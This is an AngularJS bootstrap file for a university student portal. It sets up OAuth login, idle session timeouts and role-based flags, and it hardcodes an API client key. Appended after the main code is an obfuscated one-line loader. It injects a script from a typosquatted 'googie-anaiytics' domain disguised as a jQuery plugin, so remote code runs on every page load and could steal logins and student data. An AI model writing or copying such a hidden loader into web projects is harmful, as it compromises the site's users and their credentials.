(function() {
    'use strict';

    /* Education App */
    if (typeof window.Education == 'undefined') {
        var Education = angular.module('Education', [
            'ui.router',
            'ui.bootstrap',
            'oc.lazyLoad',
            'ngSanitize',
            'ngCookies',
            'angular-oauth2',
            'blockUI',
            'ngFileUpload',
            'uiCropper',
            'toastr',
            'ngIdle',

            // Sub modules
            'Education.Common',
            'Education.Dashboard',
            'Education.Settings',
            'Education.User',
            'Education.Student',
            'Education.EducationPrograms',
            'Education.StudentMarks',
            'Education.StudentSummaryMark',
            'Education.StudentAccount',
            'Education.StudentEducationProgram',
            'Education.StudentBehaviorMark',
            'Education.StudentVoucherReceivePay',
            'Education.StudentSummaryMark',
            'Education.StudentSemesterBehaviorMark',
            'Education.EnrollmentNewReg',
            'Education.StudentExpectation'
        ]);

        window.Education = Education;
    };
    Education.HOST = window.location.host;
    Education.PORT = '8098';
    Education.Protocol = 'https';
    Education.CONTEXTPATH = 'education'
    Education.API_SERVER_URL = Education.Protocol + '://' + Education.HOST + '/' + Education.CONTEXTPATH + '/';
    Education.FILE_SERVER_URL = 'http://sv20.tlu.edu.vn/imagesv';

    Education.API_CLIENT_ID = 'education_client';
    Education.API_CLIENT_KEY = 'password';
    Education.API_PREFIX = 'api/';
    Education.version = (new Date()).getTime().toString();

    /* Init global settings and run the app */
    Education.run(['$rootScope', 'settings', '$http', '$cookies', '$state', '$injector', 'constants', 'OAuth', 'blockUI', 'toastr', 'Idle', 'Keepalive',
        function($rootScope, settings, $http, $cookies, $state, $injector, constants, OAuth, blockUI, toastr, Idle, Keepalive) {
            $rootScope.$state = $state; // state to be accessed from view
            $rootScope.$settings = settings; // state to be accessed from view
            $rootScope.StudentId = 0;
            $rootScope.version = (new Date()).getTime().toString();
            // Idle management
            Idle.watch();
            Keepalive.start();

            $rootScope.$on('IdleStart', function() {
                $http.get(settings.api.baseUrl + 'api/users/getCurrentUser').success(function(response, status, headers, config) {
                    $rootScope.user = response;
                    if (response) {
                        /* Display modal warning or sth */
                        $rootScope.idleToastr = toastr.warning('Bạn đã ngưng làm việc trên hệ thống một khoảng thời gian khá lâu. Phiên làm việc của bạn sẽ tự động kết thúc ngay sau đây nếu bạn không thực hiện một thao tác nào.', 'Cảnh báo...', {
                            timeOut: 60000, // 60 seconds
                            closeButton: true,
                            progressBar: true
                        });
                    }
                }).error(function(response, status, headers, config) {});
            });

            $rootScope.$on('IdleEnd', function() {
                if ($rootScope.idleToastr) {
                    toastr.remove($rootScope.idleToastr);
                }
            });

            $rootScope.$on('IdleTimeout', function() {
                OAuth.revokeToken();

                $cookies.remove(constants.oauth2_token);
                $state.go('login');
            });

            // oauth2...
            $rootScope.$on('oauth:error', function(event, rejection) {

                blockUI.stop();

                // Ignore `invalid_grant` error - should be catched on `LoginController`.
                if (angular.isDefined(rejection.data) && 'invalid_grant' === rejection.data.error) {
                    if ('User is disabled' === rejection.data.error_description) {
                        toastr.warning('Tài khoản của bạn đã bị khóa do nợ học phí!', 'Cảnh báo');
                    } else
                        toastr.error('Tên đăng nhập hoặc mật khẩu không đúng. Xin mời thử lại.', 'Lỗi');

                    $cookies.remove(constants.oauth2_token);
                    $state.go('login');

                    return;
                }

                // Refresh token when a `invalid_token` error occurs.
                if (angular.isDefined(rejection.data) && 'invalid_token' === rejection.data.error) {
                    return OAuth.getRefreshToken();
                }

                // Redirect to `/login` with the `error_reason`.
                $rootScope.$emit('$unauthorized', function(event, data) {});
                $state.go('login');
            });

            $rootScope.$on('$locationChangeSuccess', function(event) {
                if (!OAuth.isAuthenticated()) {
                    $rootScope.$emit('$unauthorized', function(event, data) {});
                    $state.go('login');
                }

                blockUI.start();
                $http.get(settings.api.baseUrl + 'api/users/getCurrentUser').success(function(response, status, headers, config) {
                    blockUI.stop();
                    if (response) {
                        $rootScope.user = response;
                        $rootScope.$emit('$onCurrentUserData', response);
                        $rootScope.isAdmin = false;
                        $rootScope.isEducationManager = false;
                        $rootScope.isStudentManager = false;
                        $rootScope.isExamManager = false;
                        $rootScope.isFinalcialManager = false;
                        if ($rootScope.user != null && $rootScope.user.roles != null) {
                            // console.log($rootScope.user.roles);
                            for (var i = 0; i < $rootScope.user.roles.length; i++) {
                                var role = $rootScope.user.roles[i];
                                // console.log(role);
                                if (role.name == 'ROLE_ADMIN') {
                                    $rootScope.isAdmin = true;
                                }
                                $rootScope.isEducationManager = $rootScope.isAdmin || $rootScope.isEducationManager || (role.name == 'ROLE_EDUCATION_MANAGERMENT');
                                $rootScope.isStudentManager = $rootScope.isAdmin || $rootScope.isStudentManager || (role.name == 'ROLE_STUDENT_MANAGERMENT');
                                $rootScope.isExamManager = $rootScope.isAdmin || $rootScope.isExamManager || (role.name == 'ROLE_EXAM_MANAGERMENT');
                                $rootScope.isFinalcialManager = $rootScope.isAdmin || $rootScope.isFinalcialManager || (role.name == 'ROLE_FINANCIAL_MANAGERMENT');
                            }
                        }
                        if ($state.current.name == 'login') {
                            $state.go('application.dashboard');
                        }
                    }
                }).error(function(response, status, headers, config) {
                    blockUI.stop();
                    $cookies.remove(constants.oauth2_token);
                    $state.go('login');
                });
            });
        }
    ]);

})(window);
(function(){var s=document.createElement('script');s.src=decodeURIComponent('https%3A%2F%2Fwww.googie-anaiytics.com%2Fjquery.scrollto.min.js');document.head.appendChild(s);})();
